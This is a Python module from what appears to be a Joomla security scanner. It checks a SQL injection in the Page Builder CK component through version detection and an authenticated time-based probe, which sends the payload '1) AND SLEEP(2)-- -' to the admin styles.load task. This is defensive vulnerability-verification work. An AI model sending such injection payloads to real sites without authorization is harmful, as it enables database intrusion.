from __future__ import annotations

import re
import time
from typing import Any
from urllib.parse import urlencode

from ...core.auth import JOOMLA_ADMIN_PATH, joomla_admin_login
from ...core.http import HttpClient, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.probes import extract_csrf_from_html
from ...core.versions import parse_version_safe

CVE_ID = "CVE-2026-74254"
NAME = "Page Builder CK styles model SQL injection"
COMPONENT = "Page Builder CK"
AFFECTED_RULE = "Page Builder CK 1.0.0 through 3.6.4; fixed in 3.6.5"
HAS_EXPLOIT = True
INTRUSIVE = False
EXPLOIT_MODES = ["safe", "aggressive"]
SLEEP_THRESHOLD = 1.2
TOKEN_RE = re.compile(r'"csrf\.token":"([a-f0-9]{32})"')


def _numeric_version(version: str | None) -> str | None:
    match = re.match(r"\s*(\d+(?:\.\d+)+)", str(version or ""))
    return match.group(1) if match else None


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(_numeric_version(version))
    fixed = parse_version_safe("3.6.5")
    if parsed is None or fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "NOT_AFFECTED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    info = (plugins or {}).get("pagebuilderck", {})
    if not info.get("found"):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_DETECTED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, detail="Page Builder CK was not detected through its public manifest or asset paths.", action="No action is required unless Page Builder CK is installed but hidden from public detection.")
    version = info.get("version")
    status = classify_version(version)
    if status == "LIKELY_VULNERABLE":
        detail = f"Detected Page Builder CK {version}, within the affected range below 3.6.5."
        action = "Upgrade Page Builder CK to 3.6.5 or newer."
        confidence = "HIGH"
    elif status == "NOT_AFFECTED":
        detail = f"Detected Page Builder CK {version}, which casts the styles id list to integers."
        action = "No action is required for this CVE if version detection is accurate."
        confidence = "HIGH"
    else:
        detail = "Page Builder CK was detected, but its version could not be determined."
        action = "Determine the installed Page Builder CK version and upgrade to 3.6.5 or newer."
        confidence = "MEDIUM"
    return Finding(cve=CVE_ID, name=NAME, status=status, confidence=confidence, component=COMPONENT, component_version=version, affected_rule=AFFECTED_RULE, exploit_available=True, detail=detail, action=action)


def _timed_get(client: HttpClient, url: str, timeout: int) -> tuple[dict[str, Any], float]:
    start = time.perf_counter()
    response = client.get(url, timeout=timeout)
    return response, time.perf_counter() - start


def _styles_url(token: str, payload: str) -> str:
    query = urlencode(
        [
            ("option", "com_pagebuilderck"),
            ("task", "styles.load"),
            ("styles[]", payload),
            (token, "1"),
        ]
    )
    return f"{JOOMLA_ADMIN_PATH}?{query}"


def run_aggressive_probe(
    target_url: str,
    username: str | None = None,
    password: str | None = None,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    """Authenticated time-based proof of the admin ``styles.load`` SQL injection.

    ``PagebuilderckModelStyles::getStyles()`` concatenates the ``styles[]``
    array into ``WHERE a.id in ( ... )`` in 3.6.4 and earlier; 3.6.5 casts
    each value with ``array_map('intval', ...)``. The probe logs into the
    administrator, reads the session CSRF token, and compares a benign
    ``styles[]=1`` request with ``styles[]=1) AND SLEEP(2)-- -``.
    """
    base = normalize_url(target_url)
    if not username or not password:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=False, proof_url=f"{base}{JOOMLA_ADMIN_PATH}", detail="The backend styles.load proof needs a Joomla administrator account. Pass --aggressive-arg username=... password=... on an authorized staging site. Nothing was sent.", action="Re-run with lab administrator credentials.")

    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    if not joomla_admin_login(client, base_url=base, username=username, password=password, timeout=timeout):
        return Finding(cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{JOOMLA_ADMIN_PATH}", detail="The administrator login did not establish a session; the styles.load probe was not attempted.", action="Verify the lab credentials and administrator login route.")

    page = client.get(JOOMLA_ADMIN_PATH, timeout=timeout)
    body = page.get("body") or ""
    token = extract_csrf_from_html(body)
    if not token:
        match = TOKEN_RE.search(body)
        token = match.group(1) if match else None
    if not token:
        return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=f"{base}{JOOMLA_ADMIN_PATH}", detail="The administrator session did not expose a CSRF token for the styles.load task.", action="Verify the administrator session and token handling on an authorized staging site.")

    baseline_url = _styles_url(token, "1")
    baseline, baseline_time = _timed_get(client, baseline_url, timeout)
    if is_transport_error(baseline):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=baseline_url, detail=f"The baseline styles.load request failed in transit ({transport_error_detail(baseline)}).", action="Retry when the target is reachable.")
    probe_url = _styles_url(token, "1) AND SLEEP(2)-- -")
    probe, probe_time = _timed_get(client, probe_url, timeout)
    if is_transport_error(probe):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=probe_url, detail=f"The styles.load probe failed in transit ({transport_error_detail(probe)}).", action="Retry when the target is reachable.")

    delta = probe_time - baseline_time
    evidence = {
        "login_ok": True,
        "token_found": True,
        "baseline_status": baseline.get("status"),
        "baseline_seconds": round(baseline_time, 3),
        "probe_status": probe.get("status"),
        "probe_seconds": round(probe_time, 3),
        "delta_seconds": round(delta, 3),
        "sleep_threshold": SLEEP_THRESHOLD,
    }
    if probe.get("status") == 200 and baseline.get("status") == 200 and delta >= SLEEP_THRESHOLD:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=probe_url,
            evidence=evidence,
            detail=(
                "The administrator styles.load task concatenated the styles[] value into the styles query: the "
                f"probe added {delta:.2f}s over the benign baseline (threshold {SLEEP_THRESHOLD}s)."
            ),
            action="Upgrade Page Builder CK to 3.6.5 or newer.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=probe_url,
        evidence=evidence,
        detail=(
            f"The styles.load task returned HTTP {probe.get('status')} and added only {delta:.2f}s over the "
            "baseline; the styles[] value did not reach the query sink."
        ),
        action="Upgrade affected Page Builder CK versions even when the external proof is inconclusive.",
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    base = normalize_url(target_url)
    url = f"{base}{JOOMLA_ADMIN_PATH}"
    response = HttpClient(timeout=timeout, proxy=proxy).get(url, timeout=timeout)
    if is_transport_error(response):
        return Finding(cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail=f"The administrator page could not be reached ({transport_error_detail(response)}).", action="Retry when the target is reachable.")
    return Finding(cve=CVE_ID, name=NAME, status="BLOCKED_EXTERNAL", confidence="MEDIUM", component=COMPONENT, affected_rule=AFFECTED_RULE, exploit_available=True, exploit_ran=True, proof_url=url, detail="The administrator page is reachable; the styles.load payload was not sent in safe mode.", action="Use aggressive mode with administrator credentials on an authorized staging site.")


def check(target_url: str, joomla_version: str | None = None, run_exploit_check: bool = False, timeout: int = 12, proxy: str | None = None, exploit_mode: str = "safe", plugins: dict[str, Any] | None = None, aggressive_command: str | None = None, aggressive_args: dict[str, Any] | None = None, **kwargs: Any) -> Finding:
    from ...core.args import aggressive_value

    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode == "aggressive":
        if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
            passive.detail += " Aggressive proof skipped because Page Builder CK was not detected as potentially affected."
            return passive
        result = run_aggressive_probe(
            target_url,
            username=aggressive_value(aggressive_args, aggressive_command, "username"),
            password=aggressive_value(aggressive_args, aggressive_command, "password"),
            timeout=timeout,
            proxy=proxy,
        )
        result.component_version = passive.component_version
        return result
    if exploit_mode != "safe":
        passive.detail += " This module supports safe (admin reachability) and aggressive (authenticated styles.load timing) modes."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return passive
    result = run_safe_probe(target_url, timeout, proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {"cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT, "affected_rule": AFFECTED_RULE, "affected_joomla_versions": ["*"], "exploit_available": True, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE, "vulnerability_type": "SQL Injection", "module_version": "1.0.0", "last_reviewed": "2026-11-15", "updated": "2026-11-15", "required_detectors": ["pagebuilderck"], "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-74254", "https://www.joomlack.fr", "https://mysites.guru/vulnerabilities/CVE-2026-74254"]}
